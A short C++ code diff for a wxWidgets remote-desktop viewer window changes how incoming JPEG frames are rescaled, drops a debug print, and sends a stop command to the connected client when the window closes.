@@ -79,7 +79,6 @@ void frameRemoteDesktop::OnStop(wxCommandEvent&) {
 	strComando.append(1, CMD_DEL);
 	strComando.append(1, '0');
 	int iSent = p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
-	std::cout << "[RD] " << iSent << " enviardos\n";
 }
 
 void frameRemoteDesktop::OnDrawBuffer(const char* cBuffer, int iBuffersize) {
@@ -87,7 +86,11 @@ void frameRemoteDesktop::OnDrawBuffer(const char* cBuffer, int iBuffersize) {
 		wxMemoryInputStream imgStream(cBuffer, iBuffersize);
 		wxImage img(imgStream, wxBITMAP_TYPE_JPEG);
 		
-		img.Rescale(this->GetSize().x, this->GetSize().y-20);
+		//wxIMAGE_QUALITY_FAST   Fast but same as wxIMAGE_QUALITY_NEAREST 
+		//wxIMAGE_QUALITY_HIGH   best quality
+		int x = this->GetSize().GetWidth()- 30;
+		int y = this->GetSize().GetHeight() - 90;
+		img.Rescale(x, y, wxIMAGE_QUALITY_FAST);
 		if (img.IsOk()) {
 			wxBitmap bmp_Obj(img);
 			
@@ -101,5 +104,10 @@ void frameRemoteDesktop::OnDrawBuffer(const char* cBuffer, int iBuffersize) {
 }
 
 void frameRemoteDesktop::Onclose(wxCloseEvent&) {
+	std::string strComando = std::to_string(EnumComandos::RD_Stop);
+	strComando.append(1, CMD_DEL);
+	strComando.append(1, '0');
+	int iSent = p_Servidor->cSend(this->sckCliente, strComando.c_str(), strComando.size(), 0, false);
+	Sleep(1000);
 	Destroy();
 }
